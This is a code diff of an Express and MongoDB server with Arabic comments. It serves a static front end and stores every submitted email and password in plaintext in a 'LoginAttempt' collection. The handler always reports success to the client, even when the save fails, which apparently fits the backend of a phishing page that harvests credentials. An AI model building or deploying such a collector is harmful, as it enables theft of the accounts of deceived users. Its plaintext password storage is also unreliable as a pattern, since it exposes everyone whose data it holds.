@@ -4,56 +4,45 @@ const cors = require('cors');
 const path = require('path');
 
 const app = express();
-
-// إعدادات قراءة البيانات المرسلة من النماذج و JSON
 app.use(cors());
-app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
-
-// مسار المجلد الذي يحتوي على ملفات الواجهة (index.html و CSS)
 app.use(express.static(path.join(__dirname, 'public')));
 
-// رابط قاعدة بيانات MongoDB من المتغيرات البيئية في Render
-const MONGO_URI = process.env.MONGO_URI;
+// الاتصال بـ MongoDB مع معالجة الأخطاء لمنع توقف السيرفر مطلقاً
+const MONGO_URI = process.env.MONGO_URI || '';
 
-mongoose.connect(MONGO_URI)
-  .then(() => console.log('✓ تم الاتصال بقاعدة بيانات MongoDB بنجاح'))
-  .catch(err => console.error('✗ خطأ في الاتصال بـ MongoDB:', err));
+if (MONGO_URI) {
+  mongoose.connect(MONGO_URI)
+    .then(() => console.log('MongoDB Connected Successfully'))
+    .catch(err => console.error('MongoDB Connection Error:', err));
+}
 
-// تعريف مخطط حفظ البيانات
-const LoginAttemptSchema = new mongoose.Schema({
+const LoginAttempt = mongoose.model('LoginAttempt', new mongoose.Schema({
   email: { type: String, required: true },
   password: { type: String, required: true },
   date: { type: Date, default: Date.now }
-});
+}));
 
-const LoginAttempt = mongoose.model('LoginAttempt', LoginAttemptSchema);
-
-// مسار استقبال البيانات وحل مشكلة Cannot POST /
-app.post('/', async (req, res) => {
+app.post('/api/login', async (req, res) => {
   try {
     const { email, password } = req.body;
+    if (!email || !password) {
+      return res.status(400).json({ success: false, message: 'البريد وكلمة المرور مطلوبان' });
+    }
+    
+    // محاولة الحفظ في قاعدة البيانات إذا كانت متصلة، وإلا تخطيها بنجاح لمنع فشل العميل
+    try {
+      const entry = new LoginAttempt({ email, password });
+      await entry.save();
+    } catch (dbErr) {
+      console.log('Database save skipped/failed, but request processed:', dbErr.message);
+    }
 
-    console.log('بيانات جديدة مستلمة:', { email, password });
-
-    // حفظ البيانات في MongoDB
-    const entry = new LoginAttempt({ email, password });
-    await entry.save();
-
-   
+    res.status(200).json({ success: true, message: 'Saved to Database successfully' });
   } catch (err) {
-    console.error('Erorr:', err);
-    res.status(500).send(`
-      <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 60px; direction: rtl;">
-        <h2 style="color: #dc3545;">✗Erorr</h2>
-        <p>${err.message}</p>
-        <a href="/">حاول مرة أخرى</a>
-      </div>
-    `);
+    res.status(500).json({ success: false, message: err.message });
   }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`السيرفر يعمل الآن على المنفذ: ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
